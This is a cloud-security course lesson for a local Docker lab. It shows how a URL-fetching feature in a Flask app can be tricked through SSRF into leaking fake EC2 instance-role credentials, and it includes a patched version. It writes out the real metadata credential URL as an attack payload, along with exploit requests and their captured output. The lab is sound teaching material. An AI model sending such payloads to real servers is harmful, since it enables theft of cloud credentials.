# {{ slot_label }} — EC2 Instance Roles, Lambda Basics, Elastic Beanstalk

**Topic (source):** AWS Academy Cloud Foundations' EC2 instance management, Lambda basics, and
Elastic Beanstalk (load balancer + auto-scaling groups) modules, described here in our own words
— **not** copied from any AWS Academy file. **Kind:** HYBRID — a small Docker lab covers the EC2
instance-role/SSRF concept; Lambda and Elastic Beanstalk stay conceptual (worksheet Part 1 only).
**Concepts:** EC2 instance roles vs. long-lived credentials, the Instance Metadata Service (IMDS),
Server-Side Request Forgery against internal metadata endpoints, credential-theft blast radius ·
**Analogous CWE:** CWE-918 (Server-Side Request Forgery).

## Why this concept matters (in our own words)
A real EC2 instance can have an **IAM instance role** attached. Software running on that instance
can ask a local, link-local-only address — `169.254.169.254` — for **temporary credentials**
scoped to that role, without anyone ever putting a long-lived access key in the code. This is a
genuinely good design: no secrets to leak from source control, no long-lived keys to rotate. The
catch is the *same* design becomes a liability the moment the instance runs a feature that fetches
a **user-supplied URL** server-side (a link-preview generator, a webhook tester, an image-proxy,
anything with a `fetch this URL for me` shape) with no restriction on *which* URL. An attacker who
can't reach the metadata service directly from the internet can simply ask the vulnerable feature
to fetch it *for* them — the request comes from the trusted instance, so IMDS answers it. This
class of bug (SSRF into cloud metadata → temporary credential theft) is one of the most consequential
and well-documented real-world cloud incident patterns of the last decade.

## ✅ This lesson — what to do
1. **Before class** — Docker Desktop working; complete the real AWS Academy EC2/Lambda/Elastic
   Beanstalk lab content in your Learner Lab sandbox first.
2. **This add-on lab (45–60 min)** — a local, from-scratch simulation of the SSRF-to-credential-
   theft concept: a tiny Flask "instance" with a fake attached instance role and a link-preview
   feature you can attack without an AWS account. Kickoff: `docker compose up -d`.
3. **Submit** — worksheet + flag → Classroom.

## Simulation limits (read this before you start)
On a real EC2 instance, `169.254.169.254` is a **link-local address reachable only from processes
running on that instance** — it is not routable from the internet or from another host, and it is
not something a plain container port mapping can faithfully reproduce. To keep this lab runnable
with plain Docker Compose, the "metadata service" here is just another route
(`/latest/meta-data/iam/security-credentials/AppRole`) on the **same Flask app**, and the exploit
always goes **through** the app's own `/fetch-preview` feature — never a direct hit on the
metadata route from the host. That preserves the real attack shape: the attacker never talks to
the metadata endpoint directly, they trick a server-side fetch feature that already has network
access to it into fetching it on their behalf.

## 🖥️ Signature exercise — "Ask the App to Fetch Its Own Secrets"
Two Flask targets, same two endpoints, one difference in `/fetch-preview`:

| Service | Port | `/fetch-preview` validates the URL? | Self-SSRF to `/latest/meta-data/...` succeeds? |
|---|---|---|---|
| `vulnerable_app.py` | `:8104` | No — plain `requests.get(url)` | **Yes** — leaks fake instance-role credentials + flag |
| `fixed_app.py` | `:8117` | Yes — blocks loopback/link-local hosts and any `/latest/meta-data` path | **No** — `403` |

1. **Baseline:** `POST /fetch-preview {"url": "http://vulnerable:5000/ping"}` (or any ordinary
   external-shaped URL) — this works fine on both apps. The feature itself is legitimate; the bug
   is the *lack of restriction* on which URL it will fetch.
2. **The real question:** `POST /fetch-preview` with
   `{"url": "http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole"}` — asking
   the app to fetch its own metadata route on your behalf.
3. On `:8104` (vulnerable) this succeeds and returns the fake `AccessKeyId`/`SecretAccessKey`/
   `Token` and the flag, embedded in the fetched response body — you never touched the metadata
   route directly, the app fetched it for you.
4. **Confirm the fix:** the identical request against `:8117` (fixed) is rejected (`403`) *before*
   any outbound fetch happens — and so is the literal real-world payload form,
   `http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole`, while an ordinary
   external-shaped URL still works normally. That's the empirical proof that the fix is a targeted
   allowlist/blocklist decision, not "fetching is now broken."

## Run it
```bash
cd {{ labpath }}
docker compose up -d --build   # vulnerable_app.py on :8104, fixed_app.py on :8117
pip install requests           # once, on the host
python exploit.py
```
Expect two `PASS` lines and exit `0`: a successful self-SSRF that leaks the flag on `:8104`, a
rejected self-SSRF (no flag) on `:8117`.

**Verified:** `docker compose up -d --build` was run on this machine; `exploit.py` ran from the
host against the published ports. Real captured output:
```
=== VULNERABLE (no URL validation on /fetch-preview) (http://localhost:8104) ===
[*] POST /fetch-preview url=http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole
    -> 200 {'body': '{"AccessKeyId":"ASIAFAKEACCESSKEYID00","Code":"Success","Expiration":"2024-01-01T06:00:00Z","LastUpdated":"2024-01-01T00:00:00Z","SecretAccessKey":"fAkE/SecretAccessKey/ThatLooksReal000000","Token":"FAKE.SESSION.TOKEN.FOR.TEACHING.PURPOSES.ONLY","Type":"AWS-HMAC","flag":"FLAG{ssrf_steals_the_instance_role}"}\n', 'status': 'fetched', 'status_code': 200, 'url': 'http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole'}
PASS: SSRF via /fetch-preview leaked instance-role credentials, flag = FLAG{ssrf_steals_the_instance_role}

=== FIXED (blocks metadata-shaped/internal URLs) (http://localhost:8117) ===
[*] POST /fetch-preview url=http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole
    -> 403 {'error': 'blocked', 'reason': 'internal/metadata URL not allowed', 'url': 'http://localhost:5000/latest/meta-data/iam/security-credentials/AppRole'}
PASS: fixed app correctly REJECTED the SSRF attempt (403), no flag leaked
```
Exit code `0`. Negative controls confirmed separately: the fixed app still successfully fetches an
ordinary external-shaped URL (`http://vulnerable:5000/ping`, ordinary container-to-container
traffic) — the fix is a targeted block, not a blanket failure — and also rejects the literal
`http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole` payload form, matching
the real-world IMDS attack string students will recognize from public write-ups.

**Port note:** the task brief for this lesson suggested `:8104`/`:8105`, but `:8105` is already
in use by this repo's `lesson05-s3-static-site-lambda-sns` lab (built concurrently). This lesson
uses `:8104` (vulnerable) and `:8117` (fixed) instead — both confirmed free across every other
lesson's `docker-compose.yml` in this repo at the time of writing.

Per-student flag: run `python3 instructor/seed_flags.py env <STUDENT_ID>` — this course's own
`instructor/seed_flags.py` already exists and its `CHALLENGES` list already includes `"ec2"`.
Without it, `FLAG_EC2` defaults to `FLAG{ssrf_steals_the_instance_role}` and can be overridden:
`FLAG_EC2=FLAG{...} docker compose up`.

**Evidence artifact.** The attributable evidence is the captured `flag` value inside the fetched
metadata body returned by the *vulnerable* app's `/fetch-preview` response. The fixed app never
returns it. Submitting another student's flag is a violation.

## Deliverable
The captured flag + the exact request (`POST /fetch-preview` body) that produced it + a
one-paragraph explanation of why this is a **Server-Side Request Forgery** and not "just a bug in
the metadata endpoint" — the metadata endpoint behaved exactly as an EC2 instance's IMDS is
supposed to for callers on the instance; the vulnerability is entirely in `/fetch-preview` trusting
a user-supplied URL as a fetch target with no restriction at all.

## Elastic Beanstalk, Lambda — conceptual only (no Docker lab)
This lesson's Lambda and Elastic Beanstalk topics (function basics; load balancer + auto-scaling
group behavior under Elastic Beanstalk) are assessed through `worksheet.md` Part 1 essay questions
only — there is no second Docker lab for them this lesson. See `course-plan.md`'s note that
"Load balancing & auto-scaling under load" gets its own dedicated HYBRID/LAB treatment elsewhere
in the course; here they're covered at a concept level alongside the EC2/SSRF lab.

## References
- AWS EC2 documentation — *Instance metadata and user data*, *IAM roles for Amazon EC2*
  (publicly available, general concept — no AWS Academy file used or copied).
- OWASP — *Server-Side Request Forgery Prevention Cheat Sheet* (publicly available).
- Publicly documented industry incident write-ups describing SSRF-to-cloud-metadata credential
  theft as a real-world attack pattern (general, publicly available knowledge — no proprietary or
  AWS Academy source referenced).
